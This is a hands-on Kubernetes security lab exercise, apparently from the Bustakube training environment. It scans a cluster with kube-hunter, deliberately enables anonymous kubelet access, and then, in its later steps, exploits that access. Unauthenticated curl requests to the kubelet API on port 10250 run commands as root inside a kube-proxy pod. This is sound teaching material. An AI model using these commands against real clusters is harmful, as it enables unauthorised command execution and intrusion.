---
layout: exercise
exercise: 120
title: "Exercise: Kube-Hunter"
tools: openssh-client kubectl curl yq
directories_to_sync: ssh-config CIS
---

## Steps

1. Start up a fresh `lxterminal` by clicking the "sparrow" logo in the bottom-left corner of the screen, clicking run, typing `lxterminal` and hitting enter. Alternatively, use the hot key sequence below:

    ```
    <hold down Alt><hit F2>lxterminal<HIT the enter key>
    ```

2. SSH into the control plane node on the cluster:

    ```shell
    ssh -i /sync/bustakube-node-key root@bustakube-controlplane
    ```

3. Switch directory to `/root`:

    ```shell
    cd /root
    ```

4. Pull down the kube-hunter job manifest file, saving it into the current directory:

    ```shell
    github="https://raw.githubusercontent.com/aquasecurity"
    curl -LO ${github}/kube-hunter/main/job.yaml
    ```

5. Stage this job to the Kubernetes cluster:

    ```shell
    kubectl create -f job.yaml
    ```

6. The job creates a pod whose name begins with `kube-hunter-`. We need to find the pod's name. To make this pod easier to programmatically find, use `kubectl`'s label selector flag (`-l`) to search for pods whose `job-name` label is `kube-hunter`:

    ```shell
    kubectl get pods -l job-name=kube-hunter
    ```

7. Now ask for the output to be output to json, but made more specific based on a JSONPath. You can [read more about JSONPath here](https://goessner.net/articles/JsonPath/) and [read more about Kubernetes' JSONPath support here](https://kubernetes.io/docs/reference/kubectl/jsonpath/). The important thing to understand about JSONPath is that we can use it to get a specific part of the output. We want to take the first pod in the output (`items[0]`), dig into its `.metadata` section, and then get the value of the `.name` field, so we'll use  the JSONPath `{.items[0].metadata.name}`.

    ```shell
    kubectl get pods -l job-name=kube-hunter \
      -o jsonpath='{.items[0].metadata.name}'
    ```

8. Let's assign the output of that command to the variable $pod:

    ```shell
    pod=$( kubectl get pods -l job-name=kube-hunter \
      -o jsonpath='{.items[0].metadata.name}' )
    ```

9. Now, we need to wait until this "job" pod finishes its run. Here's a while loop in shell that will run `kubectl get pod $pod` every 5 seconds until the output has "Completed" in it.

    ```shell
    while [ $(kubectl get pod $pod | grep -c Completed) -lt 1 ] ; do
      echo "Waiting for kube-hunter to finish"
      sleep 5
    done
    ```

10. Now that the pod has completed, let's get its output (`STDOUT` and `STDERR`) with `kubectl logs`:

    ```shell
    kubectl logs $pod >kube-hunter-output.txt
    ```

11. Take a look at the output:

    ```shell
    less kube-hunter-output.txt
    ```

12. Notice that the output names several findings and vulnerabilities. We can cross-reference them with kube-hunter's vulnerability knowledge base on by looking up their numbers (the first column of the kube-hunter output) with the items on this page:

    <https://aquasecurity.github.io/kube-hunter/kbindex.html>

13. Follow this link to look up vulnerability `KHV005`:

    <https://aquasecurity.github.io/kube-hunter/kb/KHV005.html>

14. None of these vulnerabilities are show-stoppers, so let's introduce a bigger issue. Turn on the `kubelet`'s anonymous mode on the two worker nodes via Bustakube's `toggle-kubelet-anonymous.sh` script:

    ```shell
    for node in bustakube-node-1 bustakube-node-2 ; do
      ssh $node "/usr/local/bin/toggle-kubelet-anonymous.sh activate"
    done
    ```

15. Now, let's run `kube-hunter` again. First, delete the original `kube-hunter` job:

    ```shell
    kubectl delete job kube-hunter
    ```

16. Create a new job using the same `job.yaml` manifest file that we used earlier.

    ```shell
    kubectl create -f job.yaml
    ```

17. Get the new pod's name, using the same JSONPath technique:

    ```shell
    pod=$(kubectl get pods -l job-name=kube-hunter \
      -o jsonpath='{.items[0].metadata.name}' )
    ```

18. Again, wait for the pod's work to complete:

    ```shell
    while [ $(kubectl get pod $pod | grep -c Completed) -lt 1 ] ; do
      echo "Waiting for kube-hunter to finish"
      sleep 5
    done
    ```

19. This time, write the output to a file called `kube-hunter-with-kubelet-anonymous.txt`:

    ```shell
    kubectl logs $pod >kube-hunter-with-kubelet-anonymous.txt
    ```

20. Take a look at this round's findings:

    ```shell
    less kube-hunter-with-kubelet-anonymous.txt
    ```

21. Notice that we have more findings, all related to the fact that any network connection to the kubelet can gain information about pods and run commands inside them.

22. Let's look up one of these new findings, `KHV040`, via this link:

    <https://aquasecurity.github.io/kube-hunter/kb/KHV040.html>

23. The knowledge base article at that link tells us that we can remediate the issue by disabling the `--enable-debugging-handlers` flag. It also refers us to the Kubernetes documentation via this link:

    <https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/#options>

24. Notice how that link's information about `--enable-debugging-handlers` tells us that the default is `true`, but also tells us that this method of remediation has been deprecated, in favor of modifying the kubelet's config file. The relevant section of the page is quoted below. This is a useful experience. Kubernetes is a fast-moving, actively-developed project. It's difficult for external tools, articles, and guides to keep up to date.

    ```
    --enable-debugging-handlers     Default: `true`

    Enables server endpoints for log collection and local running of containers and commands. (DEPRECATED: This parameter should be set via the config file specified by the Kubelet's `--config` flag. See [kubelet-config-file](https://kubernetes.io/docs/tasks/administer-cluster/kubelet-config-file/) for more information.)
    ```

25. We'll run `kube-hunter` again, but first we need to delete the last `kube-hunter` job:

    ```shell
    kubectl delete job kube-hunter
    ```

26. Now, let's do one more `kube-hunter` run, allowing `kube-hunter` to run its active tests. Use `yq` to add the `--active` flag to the `args` field in the job's container definition. You can pass the output from `yq` directly into `kubectl create -f` by specifying the hyphen (`-`) character. By convention in the Linux shell, the hyphen indicates that the command should read STDIN instead of a file.

    ```shell
    cat job.yaml |
    yq '.spec.template.spec.containers[0].args += ["--active"] ' \
    | kubectl create -f -
    ```

27. Get the new pod name.

    ```shell
    pod=$(kubectl get pods -l job-name=kube-hunter \
      -o jsonpath='{.items[0].metadata.name}' )
    ```

28. Wait for the pod's work to complete:

    ```shell
    while [ $(kubectl get pod $pod | grep -c Completed) -lt 1 ] ; do
      echo "Waiting for kube-hunter to finish"
      sleep 5
    done
    ```

29. Write the output to a file called `kube-hunter-active-mode.txt`:

    ```shell
    kubectl logs $pod >kube-hunter-active-mode.txt
    ```

30. Take a look at the new output file:

    ```shell
    less kube-hunter-active-mode.txt
    ```

31. Notice that we have one new vulnerability that wasn't found before you enabled active mode. It is number `KHV051`.

32. Read the knowledge base article on `KHV051`:

    <https://aquasecurity.github.io/kube-hunter/kb/KHV051.html>

33. Let's exploit the finding.

34. Let's communicate with the read-and-write API on the kubelet on node-1 node, which listens on TCP port `10250`.

    ```shell
    curl -ks https://10.23.58.41:10250/runningpods/
    ```

35. Note that what you received back was JSON output – you can read it, but it's much easier to read if you parse it with a tool.  The next six intermediate steps will let you experiment with the `jq` tool, short for JSON query. If you'd like, skip these steps and go straight to the step that reads "Now, let's get a list of all the pod names, with their namespaces."

36. Let's get a list of the entries in this JSON output's items array.

    ```shell
    curl -ks https://10.23.58.41:10250/runningpods/ | jq '.items'
    ```

37. Now let's see if we can get just the first item.

    ```shell
    curl -ks https://10.23.58.41:10250/runningpods/ | jq '.items[0] '
    ```

38. Now let's see if we can get just the name entry for the first item.

    ```shell
    curl -ks https://10.23.58.41:10250/runningpods/ | \
      jq '.items[0] | { name: .metadata.name }'
    ```

39. Note that the pod name we got probably wasn't the same pod name as when we got the first item.  This list is coming out unordered, different each time.  Run that same command again to see.

    ```shell
    curl -ks https://10.23.58.41:10250/runningpods/ | \
      jq '.items[0] | { name: .metadata.name }'
    ```

40. Let's add the pod's namespace to that.

    ```shell
    
    curl -ks https://10.23.58.41:10250/runningpods/ | \
      jq '.items[0] | { name: .metadata.name , namespace: .metadata.namespace}'
    ```

41. To work with the whole set of items, we'll need to send `.items` through an array sifter.  We run:

    ```shell
    curl -ks https://10.23.58.41:10250/runningpods/ | jq '.items | .[]'
    ```

42. Now, let's get a list of all the pod names, with their namespaces.

    ```shell
    curl -ks https://10.23.58.41:10250/runningpods/ | \
      jq '.items[] | {name: .metadata.name , ns: .metadata.namespace }'
    ```

43. Let's parse out the name of the pod that's running `kube-proxy`. First, let's write a `jq` line that gives us the name of the first container in every pod:

    ```shell
    curl -ks https://10.23.58.41:10250/runningpods/ | \
      jq '.items[] | .spec.containers[0].name'
    ```

44. Next, let's tell `jq` to give us the full detail on all the items, but to send that through a `select` filter that says we only want an item if its first container name is `"kube-proxy"`.

    ```shell
    curl -ks https://10.23.58.41:10250/runningpods/ | \
      jq '.items[] | select( .spec.containers[0].name == "kube-proxy") '
    ```

45. Here was the output from our test system:

    ```
    {
    "metadata": {
        "name": "kube-proxy-fgtk4",
        "namespace": "kube-system",
        "uid": "201453bf-47b7-4b77-a4ce-f9fad3f6d3b8",
        "creationTimestamp": null
    },
    "spec": {
        "containers": [
        {
            "name": "kube-proxy",
            "image": "sha256:93283b563d4777db762f6160b7f5a88942a2d6b3c115df49e7e1f366708dedb4",
            "resources": {}
        }
        ]
    },
    "status": {}
    }
    ```

46. Now, tell `jq` to just give us the name of that pod:

    ```shell

    curl -ks https://10.23.58.41:10250/runningpods/ | jq \
    '.items[] |select( .spec.containers[0].name=="kube-proxy")| .metadata.name'
    ```
    

47. Finally, set a variable to that output - use `jq`'s `-r` (raw) flag so the output doesn't have quotation (") marks around it.

    ```shell

    pod=$( curl -ks https://10.23.58.41:10250/runningpods/ | jq -r \
    '.items[] |select( .spec.containers[0].name=="kube-proxy")| .metadata.name')
    ```

48. Let's use the Kubelet API again, asking that pod to run `id` for us. The format for the URL on this API call is `/run/namespace/pod/container/`.  We use a `POST` request and pass in the command in the argument `cmd`:

    ```shell
    url="https://10.23.58.41:10250"
    curl -ks ${url}/run/kube-system/$pod/kube-proxy/ -d "cmd=id"
    ```

49. Notice that our command ran - here's the output from our test system:

    ```
    uid=0(root) gid=0(root) groups=0(root)
    ```

50. This is the end of our exercise. Please deactivate the anonymous kubelet mode:

    ```shell
    for node in bustakube-node-1 bustakube-node-2 ; do
      ssh $node "/usr/local/bin/toggle-kubelet-anonymous.sh deactivate"
    done
    ```
